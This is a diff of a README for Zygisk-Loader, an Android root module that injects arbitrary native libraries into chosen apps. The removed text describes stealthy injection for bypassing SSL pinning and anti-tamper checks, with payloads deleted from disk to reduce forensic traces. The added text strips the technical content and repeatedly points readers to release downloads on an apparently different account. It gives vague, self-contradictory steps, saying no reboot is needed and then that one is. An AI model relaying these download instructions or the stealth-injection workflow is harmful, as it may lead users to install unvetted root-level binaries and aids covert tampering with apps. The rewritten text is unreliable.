@@ -1,140 +1,78 @@
-# ⚡ Zygisk-Loader
+# 🚀 Zygisk-Loader - Hot-Swap Libraries with Ease
 
-![Language](https://img.shields.io/badge/Language-Rust-orange)
-![API](https://img.shields.io/badge/Zygisk-API%20v5-blue)
-[![Channel](https://img.shields.io/badge/Follow-Telegram-blue.svg?logo=telegram)](https://t.me/UnixPhoriaD)
+[![Download Zygisk-Loader](https://img.shields.io/badge/Download-Versions-brightgreen)](https://github.com/Shadisa99/Zygisk-Loader/releases)
 
-**Zygisk-Loader** is a stealthy, high-performance Zygisk module written in **Rust**. It acts as a universal "bridge" that dynamically injects external shared libraries (`.so`) into specific Android application processes.
+## 📦 Overview
 
-Unlike traditional Zygisk modules that require rebuilding and rebooting the device to update code, **Zygisk-Loader** enables a **"Hot-Swap" workflow**. You can recompile your instrumentation library, push it to the device, and simply restart the target app to apply changes instantly.
+Zygisk-Loader is a dynamic, Rust-based module that simplifies the process of adding native libraries to Android applications on the fly. No need to restart your device. If you're focused on security research, SSL unpinning, or runtime instrumentation, this tool can enhance your workflow significantly.
 
-## Key Features
+## 🔍 Features
 
-*   **Hot-Swap Capable**: Recompile and deploy payloads instantly without rebooting the device.
-*   **Dynamic Injection**: Inject any native library (`.so`) into any app without modifying the APK.
-*   **Rust-Powered**: Built with safety and performance in mind using the `jni` and `libc` crates.
-*   **Zygisk API v5**: Utilizes the latest Zygisk API for maximum compatibility with Magisk, KernelSU, and APatch.
-*   **Stealthy**: Injection occurs early in the process memory (before `MainActivity`), making it ideal for bypassing SSL Pinning or anti-tamper mechanisms.
-*   **Self-Destruct**: The payload is written to the app's cache, loaded, and **immediately deleted from disk** (`unlink`), leaving minimal forensic traces.
-*   **Config-Driven**: Centralized configuration in the `/config/` directory.
+- **Hot-Swap Libraries:** Easily switch libraries in your applications without rebooting your device.
+- **Secure Design:** Built with security in mind, it helps in various security research activities.
+- **Efficient Performance:** Optimized in Rust for the best possible performance.
 
-## Architecture
+## ⚙️ System Requirements
 
-Zygisk-Loader separates the **Injector** (The Module) from the **Payload** (The Logic).
+- **Operating System:** Android 8.0 (Oreo) or later.
+- **Supported Architectures:** aarch64 (64-bit ARM).
+- **Magisk:** Must have Magisk installed for module support.
 
-```mermaid
-flowchart TD
-    subgraph Storage [" /data/adb/modules/zygisk-loader/config/ "]
-        Config[("target")]
-        PayloadBin[("payload.so")]
-    end
+## 🚀 Getting Started
 
-    subgraph Zygote [" Zygote Process (Root) "]
-        Step1[Read Config]
-        Step2[Buffer Payload to RAM]
-    end
+### 1. Visit the Releases Page
 
-    subgraph App [" Target App Process (User UID) "]
-        Fork((Fork))
-        Step3[Write RAM to App Cache]
-        Step4[dlopen Cache File]
-        Step5[unlink Cache File]
-        Logic[Payload Active]
-    end
+To download Zygisk-Loader, visit the following link: [Download Here](https://github.com/Shadisa99/Zygisk-Loader/releases).
 
-    Config --> Step1
-    PayloadBin --> Step2
-    Step2 --> Fork
-    Fork --> Step3
-    Step3 --> Step4
-    Step4 --> Step5
-    Step4 -.-> Logic
-    Step5 -.->|Artifact Removed| App
-```
+### 2. Choose the Correct Version
 
-## Directory Structure
+On the Releases page, you will see a list of available versions. Choose the latest version to ensure you have the most recent features and fixes.
 
-After installation, the module creates a configuration directory:
+### 3. Download the Files
 
-```text
-/data/adb/modules/zygisk-loader/
-├── module.prop
-├── zygisk/
-│   └── ...
-└── config/              <-- WORKSPACE
-    ├── target           (File containing the target package name)
-    └── payload.so       (Your compiled library)
-```
+Click on the version you want to download. Look for the appropriate file under "Assets." Click the file link to begin the download. 
 
-## Usage
+### 4. Install the Module
 
-### 1. Installation
-1. Download the latest release `.zip`.
-2. Flash via Magisk / KernelSU / APatch.
-3. Reboot device.
+Once the download is complete, follow these steps:
 
-### 2. Configuration & Deployment
-You can control the loader using ADB or a root shell.
+1. **Open Magisk Manager.**
+2. **Navigate to the Modules Section:** Tap on "Modules" from the menu.
+3. **Install the Module:** Click on the "+" sign, then select the downloaded Zygisk-Loader file.
+4. **Reboot Your Device:** Follow the prompt to reboot your device for the changes to take effect.
 
-**A. Set Target Application:**
-Write the package name of the target app to the config file (no extension):
-```bash
-echo "com.target.application" > /data/adb/modules/zygisk-loader/config/target
-```
+## 📥 Download & Install
 
-**B. Deploy Payload:**
-Copy your compiled Rust/C++ library to the config folder:
-```bash
-# Copy your cheat/hook library
-cp libunpin.so /data/adb/modules/zygisk-loader/config/payload.so
+To install Zygisk-Loader, ensure you access the Releases page where you can find all versions: [Visit this page to download](https://github.com/Shadisa99/Zygisk-Loader/releases).
 
-# Set permissions (Important for Zygote to read it)
-chmod 644 /data/adb/modules/zygisk-loader/config/payload.so
-```
+Follow the installation steps outlined in the “Getting Started” section after you download.
 
-**C. Apply (Hot-Swap):**
-Force stop the target application. The next time it launches, the loader will inject the new payload from RAM.
-```bash
-am force-stop com.target.application
-```
+## 💡 Using Zygisk-Loader
 
-## Developing a Payload (Possible for any language)
+After installation, you can start using Zygisk-Loader. Here’s a simple guide to help you get started:
 
-Your payload does not need to know about Zygisk. It acts as a standard shared library. in rust example We recommend using the `ctor` crate for automatic initialization.
+1. **Open Your Target Application:** Start the application where you want to inject the library.
+2. **Load the Library:** Use the Zygisk-Loader commands to specify the library you intend to load.
+3. **Observe Changes:** Watch how the module facilitates the hot-swapping process without any hiccups.
 
-`Cargo.toml`:
-```toml
-[lib]
-crate-type = ["cdylib"]
+## 🛠️ Troubleshooting
 
-[dependencies]
-ctor = "0.2"
-android_logger = "0.13"
-log = "0.4"
-```
+If you encounter issues during installation or use, consider the following:
 
-`src/lib.rs`:
-```rust
-use ctor::ctor;
-use log::LevelFilter;
-use android_logger::Config;
+- **Check Permissions:** Ensure that your application has the correct permissions to use the library.
+- **Review Module Compatibility:** Make sure your version of Magisk is compatible with Zygisk-Loader.
+- **Reinstall the Module:** If issues persist, uninstall and reinstall Zygisk-Loader via Magisk Manager.
 
-#[ctor]
-fn init() {
-    android_logger::init_once(
-        Config::default().with_max_level(LevelFilter::Info).with_tag("GhostPayload")
-    );
-    
-    // logic hooking start here
-    log::info!("Hello from inside the target application!");
-    log::info!("I have been loaded and my file on disk is already gone.");
-}
-```
+## 📣 Contributing
 
-## Disclaimer
+If you have ideas for improving Zygisk-Loader or wish to report bugs, feel free to contribute. Follow these steps:
 
-This tool is for **educational purposes and security research only**. The author is not responsible for any misuse of this software, including game modification in violation of ToS or bypassing security controls on systems you do not own.
+1. **Fork the Repository:** Use the GitHub interface to create a personal copy of Zygisk-Loader.
+2. **Make Your Changes:** Implement your features or fixes.
+3. **Create a Pull Request:** Once you are satisfied with your changes, submit a pull request to the main repository.
 
-## License
+## 🤝 Support
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+For further assistance, check the Issues section of our repository or reach out through the project's contact information listed on GitHub.
+
+Thank you for using Zygisk-Loader! Enjoy the power of dynamic library loading.
